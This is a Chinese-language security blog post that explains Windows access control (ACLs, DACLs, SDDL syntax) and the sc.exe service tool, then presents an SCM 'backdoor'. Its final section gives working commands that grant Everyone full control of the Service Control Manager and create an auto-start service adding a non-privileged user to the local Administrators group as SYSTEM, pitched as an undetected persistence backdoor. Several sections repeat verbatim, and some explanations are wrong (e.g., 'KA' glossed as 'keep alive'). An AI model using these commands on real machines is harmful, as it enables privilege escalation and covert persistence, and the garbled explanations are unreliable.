## 0x01引言

前段时间在小蓝鸟上看到一个几乎不见的持久化后门--SDDL，然后就看着评论学习着，越看越迷茫就去查了查资料。

![](https://image.3001.net/images/20230602/1685667360_64793e20913fc1cb0efe9.png!small)

## 0x02 Windows中的安全模型

当 Windows
中的用户或进程尝试访问系统中的资源时，系统会使用访问令牌来标识这些用户或进程。访问令牌包括一组安全标识符（SID）、用户特定的数据和访问权限。每个用户都有一个唯一的
SID，它用于标识该用户。

访问控制列表（ACL）是一组安全描述符，用于控制对对象的访问。ACL 中包含一条条 ACE（访问控制项），每个 ACE
都描述了一个安全主体（如用户、组或计算机）对对象的访问权限。

Windows 中的安全模型通过这些基本元素来实现对资源的保护。当访问令牌中包含的 SID 与 ACL 中的 ACE
相匹配时，访问将被允许。否则，访问将被拒绝。

访问控制是 Windows 安全模型中的一个关键方面，它允许管理员通过配置 ACL
控制对资源的访问。这种方法能够提供高度的安全性，但需要仔细规划和管理，以确保正确地保护系统和应用程序。

当一个线程尝试去访问一个对象时，系统会检查线程持有的令牌以及被访问对象的安全描述符中的DACL。先查询类型为DENY的ACE，若命中且权限符合则访问拒绝；未命中再在ALLOWED类型的ACE中查询，若命中且类型符合则可以访问。

![](https://image.3001.net/images/20230602/1685667362_64793e226510a9d8beec9.png!small)

总之，ACL的组成结构包含了一系列访问控制项，每个访问控制项都包含了标识符、访问掩码、ACE类型和审计标志等信息。通过ACL，可以控制对象的访问权限，从而保护系统的安全性。

## 0x03DACL

#### 1、概念和作用

DACL指的是Discretionary Access Control
List，也就是自主访问控制列表。它是Windows中的一种安全机制，用于控制对象（如文件、目录、注册表项等）的访问权限。是一组ACE（Access
Control
Entry，访问控制项）的集合，每个ACE对应一个用户或用户组，并定义了该用户或用户组在对象上所具有的访问权限。DACL中的ACE分为Allow和Deny两种类型，Allow表示允许访问，Deny表示拒绝访问。在Windows中，每个对象都有一个DACL，用于控制哪些用户可以访问该对象。

![](https://image.3001.net/images/20230602/1685667363_64793e23d312a32a0c59f.png!small)

#### 2、格式和语法

DACL的格式和语法基于SDDL（Security Descriptor Definition
Language），SDDL是一种字符串表示形式，用于描述安全描述符和访问控制列表。以下是SDDL语法的基本格式：

cssCopy code

    
    
    D:(A;;[Access Type];[Security Identifier])

其中，D:表示这是DACL的SDDL字符串，A表示ACE中的对象类型，Access Type表示访问权限的类型，Security
Identifier表示允许或拒绝访问的安全标识符（SID）。

Access Type包括以下部分：

  * • • A：代表允许对对象的访问。
  * • • D：代表拒绝对对象的访问。
  * • • OA：代表允许对对象的所有者访问。
  * • • OD：代表拒绝对对象的所有者访问。
  * • • GA：代表允许对对象的组访问。
  * • • GD：代表拒绝对对象的组访问。因此，一个完整的DACL SDDL字符串可能如下所示：

cssCopy code

    
    
    D:(A;;GA;;;WD)(A;;GA;;;SY)(A;;0x1201bf;;;S-1-5-32-544)

其中，这个DACL允许组Everyone和系统用户具有完全访问权限，并且允许本地管理员组具有包括删除和修改权限的特定访问权限。

## 0x04、SDDL

#### 1、概念和作用

SDDL（Security Descriptor Definition
Language）是一种描述Windows安全描述符的语言，它用于描述Windows安全对象的安全描述符，包括访问控制列表（ACL）、安全标识符（SID）、安全描述符的所有者和主要组等。

SDDL的作用主要有以下几个方面：

  1. 1\. 显示安全描述符信息：使用SDDL可以将安全描述符转换为易读的字符串形式，从而方便用户查看和理解其中的信息。
  2. 2\. 编辑安全描述符：SDDL提供了一种统一的方式来编辑安全描述符的信息，用户可以使用SDDL语法修改安全描述符的内容，以实现对安全对象的访问控制。
  3. 3\. 传输安全描述符：SDDL可以将安全描述符的信息以字符串的形式传输，以方便在不同的系统之间共享安全描述符的信息。SDDL语言结构非常灵活，可以用于描述多种安全对象，包括文件、目录、注册表、命名管道等。

#### 2、语法和格式

SDDL（Security Descriptor Definition Language）是一种描述安全描述符（Security
Descriptor）的语言，用于在Windows中定义和修改对象的安全描述符，包括访问控制列表（ACL）、SACL和安全描述符的所有者和主要组。

SDDL语法由多个段组成，每个段用分号分隔。下面是一个包含所有段的示例：

cssCopy code

    
    
    O:SYG:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CR;;;AU)(A;;CCLCSWRPLOCRRC;;;PU)(A;;CCLCSWRPLOCRRC;;;SY)

每个段表示安全描述符的一个组件，以下是每个段的含义：

  * • • O：安全描述符的所有者。
  * • • G：安全描述符的主要组。
  * • • D：DACL段，表示对象的访问控制列表。
  * • • S：SACL段，表示对象的安全审核策略。
  * • • A：ACE段，表示允许或拒绝特定用户或组访问对象，ACE段由多个字段组成，分别表示访问掩码、安全标识符、ACE类型和ACE标志等。

下面是一个示例，展示了包含一个DACL和一个SACL的SDDL格式的安全描述符：

    
    
    D:(A;;GA;;;SY)(A;;GA;;;BA)(A;;GA;;;WD)(A;;GX;;;CO)S:(AU;SAFA;GA;;;WD)(AU;SAFA;GXGW;;;CO)

该SDDL描述符由两个段组成，第一个段（D）表示DACL，它允许系统管理员、内置管理员和所有用户以读取和写入的方式访问对象。第二个段（S）表示SACL，它允许系统管理员和内置管理员对对象进行安全审核，并将所有事件发送到安全日志中。

#### 3、SDDL编辑DACL以及SACL

使用SDDL来设置和修改DACL和SACL的步骤如下：

  1. 1\. 编写SDDL字符串

首先，需要编写SDDL字符串。SDDL字符串是一种描述安全描述符的文本格式，它由多个子项组成，每个子项对应于一个权限或一个安全标识符（SID）。

一个简单的SDDL字符串的示例为：D:(A;;GA;;;WD)(A;;GA;;;BA)

在这个示例中，D: 表示此SDDL字符串是用来描述DACL，即访问控制列表；A;;GA;;;WD
表示给Everyone用户组授予了读取和写入权限；(A;;GA;;;BA) 表示给Administrators用户组授予了读取和写入权限。2.
使用sc.exe命令行工具设置DACL和SACL

接下来，可以使用sc.exe命令行工具来设置DACL和SACL。sc.exe命令行工具是Windows操作系统自带的一个工具，可以用来管理服务。通过sc.exe工具，可以使用SDDL字符串来设置服务的DACL和SACL。

## 0x05 命令行工具sc.exe

#### 1、概念和作用

sc.exe是Windows操作系统中的命令行工具，用于管理和控制Windows服务。通过sc.exe，用户可以创建、修改、删除和查询Windows服务，以及控制服务的启动和停止等操作。sc.exe还可以用于修改服务的启动类型、设置服务的依赖关系和描述信息等功能。

具体来说，sc.exe提供了以下主要的功能：

  1. 1\. 创建Windows服务：用户可以使用sc.exe命令创建新的Windows服务。
  2. 2\. 修改Windows服务：用户可以使用sc.exe命令修改现有的Windows服务的配置信息。
  3. 3\. 删除Windows服务：用户可以使用sc.exe命令删除不需要的Windows服务。
  4. 4\. 查询Windows服务：用户可以使用sc.exe命令查看Windows服务的状态、配置信息和依赖关系等。
  5. 5\. 控制Windows服务：用户可以使用sc.exe命令启动、停止、暂停或恢复Windows服务的运行。
  6. 6\. 设置Windows服务的安全性：用户可以使用sc.exe命令设置Windows服务的安全性，包括修改服务的DACL和SACL等。

sc.exe是Windows系统中非常重要的命令行工具，可以方便地管理和控制Windows服务，保障系统的正常运行和安全性。

#### 2、基本用法和常用命令

sc.exe 是 Windows 操作系统自带的一个命令行工具，它可以用于管理 Windows
服务，包括创建、删除、启动、停止、修改服务的配置信息等操作。以下是 sc.exe 的一些常用命令和基本用法：

  1. 1\. 列出所有服务

#### 2、格式和语法

DACL的格式和语法基于SDDL（Security Descriptor Definition
Language），SDDL是一种字符串表示形式，用于描述安全描述符和访问控制列表。以下是SDDL语法的基本格式：

cssCopy code

    
    
    D:(A;;[Access Type];[Security Identifier])

其中，D:表示这是DACL的SDDL字符串，A表示ACE中的对象类型，Access Type表示访问权限的类型，Security
Identifier表示允许或拒绝访问的安全标识符（SID）。

Access Type包括以下部分：

  * • • A：代表允许对对象的访问。
  * • • D：代表拒绝对对象的访问。
  * • • OA：代表允许对对象的所有者访问。
  * • • OD：代表拒绝对对象的所有者访问。
  * • • GA：代表允许对对象的组访问。
  * • • GD：代表拒绝对对象的组访问。因此，一个完整的DACL SDDL字符串可能如下所示：

cssCopy code

    
    
    D:(A;;GA;;;WD)(A;;GA;;;SY)(A;;0x1201bf;;;S-1-5-32-544)

其中，这个DACL允许组Everyone和系统用户具有完全访问权限，并且允许本地管理员组具有包括删除和修改权限的特定访问权限。

## 0x04、SDDL

#### 1、概念和作用

SDDL（Security Descriptor Definition
Language）是一种描述Windows安全描述符的语言，它用于描述Windows安全对象的安全描述符，包括访问控制列表（ACL）、安全标识符（SID）、安全描述符的所有者和主要组等。

SDDL的作用主要有以下几个方面：

  1. 1\. 显示安全描述符信息：使用SDDL可以将安全描述符转换为易读的字符串形式，从而方便用户查看和理解其中的信息。
  2. 2\. 编辑安全描述符：SDDL提供了一种统一的方式来编辑安全描述符的信息，用户可以使用SDDL语法修改安全描述符的内容，以实现对安全对象的访问控制。
  3. 3\. 传输安全描述符：SDDL可以将安全描述符的信息以字符串的形式传输，以方便在不同的系统之间共享安全描述符的信息。SDDL语言结构非常灵活，可以用于描述多种安全对象，包括文件、目录、注册表、命名管道等。

#### 2、语法和格式

SDDL（Security Descriptor Definition Language）是一种描述安全描述符（Security
Descriptor）的语言，用于在Windows中定义和修改对象的安全描述符，包括访问控制列表（ACL）、SACL和安全描述符的所有者和主要组。

SDDL语法由多个段组成，每个段用分号分隔。下面是一个包含所有段的示例：

cssCopy code

    
    
    O:SYG:SYD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SO)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CR;;;AU)(A;;CCLCSWRPLOCRRC;;;PU)(A;;CCLCSWRPLOCRRC;;;SY)

每个段表示安全描述符的一个组件，以下是每个段的含义：

  * • • O：安全描述符的所有者。
  * • • G：安全描述符的主要组。
  * • • D：DACL段，表示对象的访问控制列表。
  * • • S：SACL段，表示对象的安全审核策略。
  * • • A：ACE段，表示允许或拒绝特定用户或组访问对象，ACE段由多个字段组成，分别表示访问掩码、安全标识符、ACE类型和ACE标志等。

下面是一个示例，展示了包含一个DACL和一个SACL的SDDL格式的安全描述符：

    
    
    D:(A;;GA;;;SY)(A;;GA;;;BA)(A;;GA;;;WD)(A;;GX;;;CO)S:(AU;SAFA;GA;;;WD)(AU;SAFA;GXGW;;;CO)

该SDDL描述符由两个段组成，第一个段（D）表示DACL，它允许系统管理员、内置管理员和所有用户以读取和写入的方式访问对象。第二个段（S）表示SACL，它允许系统管理员和内置管理员对对象进行安全审核，并将所有事件发送到安全日志中。

#### 3、SDDL编辑DACL以及SACL

使用SDDL来设置和修改DACL和SACL的步骤如下：

  1. 1\. 编写SDDL字符串

首先，需要编写SDDL字符串。SDDL字符串是一种描述安全描述符的文本格式，它由多个子项组成，每个子项对应于一个权限或一个安全标识符（SID）。

一个简单的SDDL字符串的示例为：D:(A;;GA;;;WD)(A;;GA;;;BA)

在这个示例中，D: 表示此SDDL字符串是用来描述DACL，即访问控制列表；A;;GA;;;WD
表示给Everyone用户组授予了读取和写入权限；(A;;GA;;;BA) 表示给Administrators用户组授予了读取和写入权限。2.
使用sc.exe命令行工具设置DACL和SACL

接下来，可以使用sc.exe命令行工具来设置DACL和SACL。sc.exe命令行工具是Windows操作系统自带的一个工具，可以用来管理服务。通过sc.exe工具，可以使用SDDL字符串来设置服务的DACL和SACL。

## 0x05 命令行工具sc.exe

#### 1、概念和作用

sc.exe是Windows操作系统中的命令行工具，用于管理和控制Windows服务。通过sc.exe，用户可以创建、修改、删除和查询Windows服务，以及控制服务的启动和停止等操作。sc.exe还可以用于修改服务的启动类型、设置服务的依赖关系和描述信息等功能。

具体来说，sc.exe提供了以下主要的功能：

  1. 1\. 创建Windows服务：用户可以使用sc.exe命令创建新的Windows服务。
  2. 2\. 修改Windows服务：用户可以使用sc.exe命令修改现有的Windows服务的配置信息。
  3. 3\. 删除Windows服务：用户可以使用sc.exe命令删除不需要的Windows服务。
  4. 4\. 查询Windows服务：用户可以使用sc.exe命令查看Windows服务的状态、配置信息和依赖关系等。
  5. 5\. 控制Windows服务：用户可以使用sc.exe命令启动、停止、暂停或恢复Windows服务的运行。
  6. 6\. 设置Windows服务的安全性：用户可以使用sc.exe命令设置Windows服务的安全性，包括修改服务的DACL和SACL等。

sc.exe是Windows系统中非常重要的命令行工具，可以方便地管理和控制Windows服务，保障系统的正常运行和安全性。

#### 2、基本用法和常用命令

sc.exe 是 Windows 操作系统自带的一个命令行工具，它可以用于管理 Windows
服务，包括创建、删除、启动、停止、修改服务的配置信息等操作。以下是 sc.exe 的一些常用命令和基本用法：

  1. 1\. 列出所有服务 `sc.exe query`

![](https://image.3001.net/images/20230602/1685667365_64793e2562bd8e67882aa.png!small)

  1. 1\. 列出指定服务的信息

    
    
    sc.exe query [service_name]

![](https://image.3001.net/images/20230602/1685667366_64793e26d841c5e0e7127.png!small)

  1. 1\. 创建一个服务

    
    
    sc.exe create [service_name] [bin_path] [start_type] [error_control] [display_name] [depend]

其中，[bin_path] 是服务程序的路径，[start_type] 是服务的启动类型，可以为
auto（自动启动）、demand（手动启动）、disabled（禁用），[error_control] 是服务出错时的处理方式，可以为
normal、ignore、critical，[display_name] 是服务的显示名称，[depend] 是服务所依赖的其他服务的名称。

  1. 1\. 删除一个服务

    
    
    sc.exe delete [service_name]

  1. 1\. 启动一个服务

    
    
    sc.exe start [service_name]

  1. 1\. 停止一个服务

    
    
    sc.exe stop [service_name]

  1. 1\. 修改服务的配置信息

    
    
    sc.exe config [service_name] [option1=value1] [option2=value2] ...

其中，[option1=value1] 等是要修改的配置选项和对应的值，比如 start=auto 表示将服务的启动类型改为自动启动。

除了以上命令，sc.exe 还有其他一些命令，如 pause、resume、qc、qdescription 等，可以通过输入 sc.exe /?
查看所有可用的命令和选项。

#### 3 sc设置DACL和SACL

以设置服务DACL为例，使用以下命令：

    
    
    sc.exe sdset <service name> <sddl string>

其中，`<service name>`表示服务名称，`<sddl string> `表示要设置的SDDL字符串。

如果想要设置服务的SACL，可以使用以下命令：

    
    
    sc.exe sdset <service name> S:(<sddl string>)

其中，`<service name> `表示服务名称，S: 表示要设置SACL，而不是DACL，`<sddl string>`表示要设置的SDDL字符串。

  1. 1\. 验证DACL和SACL的设置

最后，需要验证DACL和SACL的设置是否生效。可以使用以下命令来查看服务的DACL和SACL：

    
    
    sc.exe sdshow <service name>

其中，`<service name>`表示服务名称。如果DACL和SACL设置成功，将会在命令输出中看到对应的SDDL字符串。

## 0x06后门

    
    
    sc.exe sdset scmanager D:(A;;KA;;;WD)

这个命令的作用是设置Windows Service Controller的安全描述符（Security Descriptor），其中：

  * • • `sc.exe`是Windows的命令行服务管理工具。
  * • • `sdset`是命令行中用来设置安全描述符的命令。
  * • • `scmanager`是Windows服务控制器的服务名称，用于管理系统中所有的Windows服务。
  * • • `D:(A;;KA;;;WD)`是安全描述符的字符串表示，其中 `D:`表示将安全描述符应用到 `scmanager`服务的 DACL（Discretionary Access Control List）上。`A`表示允许访问，`KA`表示对于“keep alive”相关的请求允许访问，`WD`表示允许对于所有用户都允许访问。

因此，这个命令的作用是设置 Windows Service Controller 服务的安全描述符，允许任何用户访问并保持服务保持连接。赋予
Everyone 组具有 KEY_ALL_ACCESS 访问权限。也就是让所有人都可以控制服务管理器，包括创建服务、删除服务、启动/停止服务等操作。

简单来说允许每个人创建新的系统服务。实际上意味着“允许以本地系统运行任何 exe”。

![](https://image.3001.net/images/20230602/1685667368_64793e284fbd50edaa0e5.png!small)

可以通过

    
    
    sc.exe sdshow scmanager showrights

来枚举服务的权限

![](https://image.3001.net/images/20230602/1685667369_64793e29cee3130a24475.png!small)

在我们执行了这个命令之后我们可以使用普通用户以及非特权用户创建一个服务

    
    
    sc create LPE displayName= "LPE" binPath= "C:\Windows\System32\net.exe localgroup Administrators nonpriv-user /add" start= auto

将我们的帐户添加到这台机器的本地管理员组 然后重启机器让服务控制管理器以 **SYSTEM**
权限执行我们的新服务。一旦它重新上线，我们应该看到我们的帐户现在已添加到本地管理员。一个不被发现的持久化后门就搞定了。

